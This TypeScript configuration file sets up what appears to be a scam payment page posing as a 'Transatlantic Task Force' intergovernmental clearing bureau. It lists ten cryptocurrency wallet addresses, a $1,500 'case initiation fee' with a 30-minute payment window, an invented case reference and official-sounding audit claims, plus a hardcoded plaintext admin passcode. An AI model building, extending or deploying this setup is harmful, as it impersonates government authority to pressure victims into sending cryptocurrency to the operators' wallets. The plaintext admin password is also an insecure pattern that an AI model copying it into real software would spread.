/**
 * ─────────────────────────────────────────────────────────────────
 * TRANSATLANTIC TASK FORCE (TATF) — FINANCIAL SETTLEMENT GATEWAY
 * Intergovernmental Maritime & Defense Financial Clearing Bureau
 * ─────────────────────────────────────────────────────────────────
 */

export type VerifyMode = 'bitcoin' | 'blockchair-utxo' | 'blockchair-eth' | 'manual';

export type Coin = {
  id: string;
  name: string;
  symbol: string;
  networkLabel: string;
  address: string;
  color: string;
  coingeckoId: string;
  fallbackRate: number;
  displayDecimals: number;
  txidPattern: RegExp;
  uriScheme?: string;
  verify: VerifyMode;
  blockchairSlug?: string;
  requiredConfirmations: number;
  enabled: boolean;
};

const HEX64 = /^[0-9a-fA-F]{64}$/;
const HEX64_0X = /^0x[0-9a-fA-F]{64}$/;
const BASE58_SIG = /^[1-9A-HJ-NP-Za-km-z]{60,90}$/;

export const DEFAULT_COINS: Coin[] = [
  {
    id: 'btc',
    name: 'Bitcoin',
    symbol: 'BTC',
    networkLabel: 'Bitcoin Core Network',
    address: 'bc1q4d5cylykj8jvufudyqjkgfhqugpzr6aelsy4jk',
    color: '#F7931A',
    coingeckoId: 'bitcoin',
    fallbackRate: 98500,
    displayDecimals: 8,
    txidPattern: HEX64,
    uriScheme: 'bitcoin',
    verify: 'bitcoin',
    requiredConfirmations: 2,
    enabled: true,
  },
  {
    id: 'eth',
    name: 'Ethereum',
    symbol: 'ETH',
    networkLabel: 'ERC-20 Mainnet Protocol',
    address: '0x25c2Ec39189C450Bd36bc34F564F74cE2A9944b5',
    color: '#627EEA',
    coingeckoId: 'ethereum',
    fallbackRate: 3250,
    displayDecimals: 6,
    txidPattern: HEX64_0X,
    uriScheme: 'ethereum',
    verify: 'blockchair-eth',
    blockchairSlug: 'ethereum',
    requiredConfirmations: 12,
    enabled: true,
  },
  {
    id: 'usdt',
    name: 'Tether USD',
    symbol: 'USDT',
    networkLabel: 'TRC-20 Clearing Rail',
    address: 'TNbZwdnUZgeeU4TuKyFwCrLFj3zS1eYCar',
    color: '#26A17B',
    coingeckoId: 'tether',
    fallbackRate: 1,
    displayDecimals: 2,
    txidPattern: HEX64,
    verify: 'manual',
    requiredConfirmations: 20,
    enabled: true,
  },
  {
    id: 'sol',
    name: 'Solana',
    symbol: 'SOL',
    networkLabel: 'Solana Cluster Network',
    address: 'F5hrW6iyaiQYYqGLiwNEVBEqs8auMZE7Yv1XPJBixgTD',
    color: '#9945FF',
    coingeckoId: 'solana',
    fallbackRate: 155,
    displayDecimals: 4,
    txidPattern: BASE58_SIG,
    verify: 'manual',
    requiredConfirmations: 32,
    enabled: true,
  },
  {
    id: 'ltc',
    name: 'Litecoin',
    symbol: 'LTC',
    networkLabel: 'Litecoin Core Rail',
    address: 'ltc1qst8q65g7efuzgt9vkydkf5tmlrnun3naahzgsl',
    color: '#345D9D',
    coingeckoId: 'litecoin',
    fallbackRate: 92,
    displayDecimals: 8,
    txidPattern: HEX64,
    uriScheme: 'litecoin',
    verify: 'blockchair-utxo',
    blockchairSlug: 'litecoin',
    requiredConfirmations: 6,
    enabled: true,
  },
  {
    id: 'bnb',
    name: 'BNB',
    symbol: 'BNB',
    networkLabel: 'BEP-20 Smart Clearing',
    address: '0x25c2Ec39189C450Bd36bc34F564F74cE2A9944b5',
    color: '#F3BA2F',
    coingeckoId: 'binancecoin',
    fallbackRate: 610,
    displayDecimals: 5,
    txidPattern: HEX64_0X,
    verify: 'manual',
    requiredConfirmations: 15,
    enabled: true,
  },
  {
    id: 'xrp',
    name: 'XRP Ledger',
    symbol: 'XRP',
    networkLabel: 'Ripple Net Ledger',
    address: 'rGwBqD6ibRcBghps53e1XyZu7eXHN23quj',
    color: '#23292F',
    coingeckoId: 'ripple',
    fallbackRate: 2.15,
    displayDecimals: 4,
    txidPattern: HEX64,
    verify: 'manual',
    requiredConfirmations: 4,
    enabled: true,
  },
  {
    id: 'bch',
    name: 'Bitcoin Cash',
    symbol: 'BCH',
    networkLabel: 'Bitcoin Cash Protocol',
    address: 'bitcoincash:qqywv3rn8dsea0ffd9qwg8h5pwnkvrs9qc05rcx3hd',
    color: '#8DC351',
    coingeckoId: 'bitcoin-cash',
    fallbackRate: 440,
    displayDecimals: 8,
    txidPattern: /^[0-9a-zA-Z]{32,128}$/,
    uriScheme: 'bitcoincash',
    verify: 'blockchair-utxo',
    blockchairSlug: 'bitcoin-cash',
    requiredConfirmations: 3,
    enabled: true,
  },
  {
    id: 'doge',
    name: 'Dogecoin',
    symbol: 'DOGE',
    networkLabel: 'Dogecoin Ledger',
    address: 'DAfjq6cbn3DswxfPKabHuT5PAb4DGeWypA',
    color: '#C2A633',
    coingeckoId: 'dogecoin',
    fallbackRate: 0.28,
    displayDecimals: 4,
    txidPattern: HEX64,
    uriScheme: 'dogecoin',
    verify: 'blockchair-utxo',
    blockchairSlug: 'dogecoin',
    requiredConfirmations: 10,
    enabled: true,
  },
  {
    id: 'trx',
    name: 'TRON Protocol',
    symbol: 'TRX',
    networkLabel: 'Tron Network',
    address: 'TNbZwdnUZgeeU4TuKyFwCrLFj3zS1eYCar',
    color: '#EF0027',
    coingeckoId: 'tron',
    fallbackRate: 0.16,
    displayDecimals: 2,
    txidPattern: HEX64,
    verify: 'manual',
    requiredConfirmations: 20,
    enabled: true,
  },
];

// Re-export as COINS for backward compatibility
export const COINS = DEFAULT_COINS;

export interface OrganizationSettings {
  taskForceName: string;
  subAgency: string;
  caseReference: string;
  operationCode: string;
  fiatAmount: number;
  fiatCurrency: string;
  windowMinutes: number;
  disclaimerNote: string;
  complianceLevel: string;
}

export const DEFAULT_ORG_SETTINGS: OrganizationSettings = {
  taskForceName: 'Transatlantic Joint Task Force',
  subAgency: 'Bureau of International Maritime & Strategic Settlement',
  caseReference: 'TATF-SEC-2026/894-B',
  operationCode: 'TRANS-ATLANTIC-TASKFORCE',
  fiatAmount: 1500,
  fiatCurrency: 'USD',
  windowMinutes: 30,
  disclaimerNote:
    'Official Transatlantic clearing window. Transactions are logged under bilateral mutual audit protocols.',
  complianceLevel: 'FATF Tier-1 / CASE INITIATION FEE',
};

export const ADMIN_PASSCODE = 'SHadow2018@#';

/**
 * Simple command link slug:
 *   https://your-site.com/#admin
 *   https://your-site.com/?admin
 *   https://your-site.com/admin
 */
export const ADMIN_LINK_KEY = 'admin';
